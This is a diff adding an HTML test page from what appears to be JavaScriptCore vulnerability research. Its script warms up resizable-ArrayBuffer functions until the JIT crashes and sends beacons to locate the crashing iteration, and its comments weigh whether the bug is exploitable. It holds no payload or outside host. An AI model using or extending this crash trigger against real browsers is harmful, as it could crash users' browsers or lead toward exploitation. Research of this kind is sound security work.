@@ -1,0 +1,86 @@
+<!--
+  p608g: Pinpoint which warmup iteration causes the crash
+
+  p608e: 5th resizable+fill function crashes during 0x1000 warmup with storeVal=42.
+  p608f: Functions 1-4 have zero corruption.
+
+  Question: does the crash happen DURING DFG compilation (~iteration 100-200)
+  or during EXECUTION of DFG-compiled code (iteration 200+)?
+
+  If during compilation → compiler bug → DoS only
+  If during execution → bad codegen → potentially controllable
+
+  This probe sends beacons at iteration milestones during the 5th function's warmup.
+  The last beacon before crash tells us exactly when.
+
+  CRASH_CLASS: MODERATE (5th function will crash)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p608g</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+
+function main(){
+b('P608G-CRASH-ITERATION');
+
+// Functions 1-4: warm up normally (no beacons during warmup)
+function t1(sv,fo){var ab=new ArrayBuffer(0x100,{"maxByteLength":0x1000});var ta=new Uint32Array(ab);var v=0;var a=fo[0];var c=fo[1];var d=fo[2];var e=fo[3];var f=fo[4];ta[3]=sv;a.y={};c.y={};d.y={};e.y={};f.y={};return v;}
+function t2(sv,fo){var ab=new ArrayBuffer(0x100,{"maxByteLength":0x1000});var ta=new Uint32Array(ab);var v=0;var a=fo[0];var c=fo[1];var d=fo[2];var e=fo[3];var f=fo[4];ta[3]=sv;a.y={};c.y={};d.y={};e.y={};f.y={};return v;}
+function t3(sv,fo){var ab=new ArrayBuffer(0x100,{"maxByteLength":0x1000});var ta=new Uint32Array(ab);var v=0;var a=fo[0];var c=fo[1];var d=fo[2];var e=fo[3];var f=fo[4];ta[3]=sv;a.y={};c.y={};d.y={};e.y={};f.y={};return v;}
+function t4(sv,fo){var ab=new ArrayBuffer(0x100,{"maxByteLength":0x1000});var ta=new Uint32Array(ab);var v=0;var a=fo[0];var c=fo[1];var d=fo[2];var e=fo[3];var f=fo[4];ta[3]=sv;a.y={};c.y={};d.y={};e.y={};f.y={};return v;}
+
+var fns=[t1,t2,t3,t4];
+for(var n=0;n<4;n++){
+    var fl=[];for(var i=0;i<8;i++)fl.push({x:1});
+    for(var i=0;i<0x1000;i++) fns[n](42,fl);
+}
+b('FN1-4-WARMED');
+
+// Function 5: warmup with iteration-level beacons
+// DFG compilation threshold is typically ~100 calls on JSC
+function t5(sv,fo){
+    var ab=new ArrayBuffer(0x100,{"maxByteLength":0x1000});
+    var ta=new Uint32Array(ab);
+    var v=0;
+    var a=fo[0];var c=fo[1];var d=fo[2];var e=fo[3];var f=fo[4];
+    ta[3]=sv;
+    a.y={};c.y={};d.y={};e.y={};f.y={};
+    return v;
+}
+
+var fl5=[];for(var i=0;i<8;i++)fl5.push({x:1});
+
+b('FN5-WARMUP-START');
+
+// Fine-grained iteration beacons
+// JSC DFG threshold is ~66-100 calls for simple functions
+for(var i=0;i<0x1000;i++){
+    if(i===10) b('FN5-I10');
+    if(i===25) b('FN5-I25');
+    if(i===50) b('FN5-I50');
+    if(i===66) b('FN5-I66');
+    if(i===80) b('FN5-I80');
+    if(i===100) b('FN5-I100');
+    if(i===120) b('FN5-I120');
+    if(i===150) b('FN5-I150');
+    if(i===200) b('FN5-I200');
+    if(i===256) b('FN5-I256');
+    if(i===300) b('FN5-I300');
+    if(i===400) b('FN5-I400');
+    if(i===512) b('FN5-I512');
+    if(i===600) b('FN5-I600');
+    if(i===700) b('FN5-I700');
+    if(i===800) b('FN5-I800');
+    if(i===900) b('FN5-I900');
+    if(i===1000) b('FN5-I1000');
+    if(i===1500) b('FN5-I1500');
+    if(i===2000) b('FN5-I2000');
+    if(i===3000) b('FN5-I3000');
+
+    t5(42,fl5);
+}
+b('FN5-WARMUP-DONE');
+b('P608G-COMPLETE');
+}
+
+setTimeout(main,200);
+</script></head><body>p608g: crash iteration</body></html>
